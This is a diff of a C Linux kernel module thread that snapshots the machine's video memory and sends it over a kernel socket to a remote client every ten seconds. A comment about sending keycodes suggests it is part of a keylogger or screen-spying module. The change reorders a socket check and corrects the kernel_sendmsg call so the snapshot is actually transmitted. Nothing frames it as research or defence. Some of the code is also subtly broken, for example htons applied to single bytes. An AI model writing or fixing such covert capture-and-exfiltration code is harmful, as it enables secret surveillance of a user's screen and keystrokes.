@@ -47,14 +47,17 @@ static int get_memory_thread_fn(void *data) {
             iounmap(video_mem_snapshot);
             return -ENOMEM;
         }
-
+        
         // Capture the video memory snapshot
         memcpy(snapshot_buffer, video_mem_snapshot, VIDEO_MEMORY_SIZE);
         unsigned char* snapshot = (unsigned char*)snapshot_buffer;
 
-        iovector.iov_base = snapshot;
-        iovector.iov_len = sizeof(unsigned char)*VIDEO_MEMORY_SIZE;
+        // Try to send keycode to client
+        if (client_sock == NULL) {
+            return 0;
         
+        }
+
         memset(&message, 0, sizeof(message));
         message.msg_name = &client_address;
         message.msg_namelen = sizeof(client_address);
@@ -62,12 +65,7 @@ static int get_memory_thread_fn(void *data) {
         message.msg_controllen = 0;
         message.msg_flags = 0;
             
-        // Try to send keycode to client
-        if (client_sock == NULL) {
-            return 0;
         
-        }
-
         // Write the snapshot into the socket
         printk(KERN_INFO "Sending Video Memory Snapshot...\n");
         unsigned int i;
@@ -76,10 +74,14 @@ static int get_memory_thread_fn(void *data) {
             snapshot[i] = htons(snapshot[i]);     
         }
 
-        ret = kernel_sendmsg(client_sock, &message, &iovector, VIDEO_MEMORY_SIZE, sizeof(snapshot[0]));
+        iovector.iov_base = snapshot;
+        iovector.iov_len = sizeof(unsigned char)*VIDEO_MEMORY_SIZE;
+        
+        ret = kernel_sendmsg(client_sock, &message, &iovector, 1, VIDEO_MEMORY_SIZE*sizeof(unsigned char));
         if (ret < 0) {
             printk(KERN_ERR "Failed to send snapshot to client\n");
         }
+
 
         msleep(10000);
     }
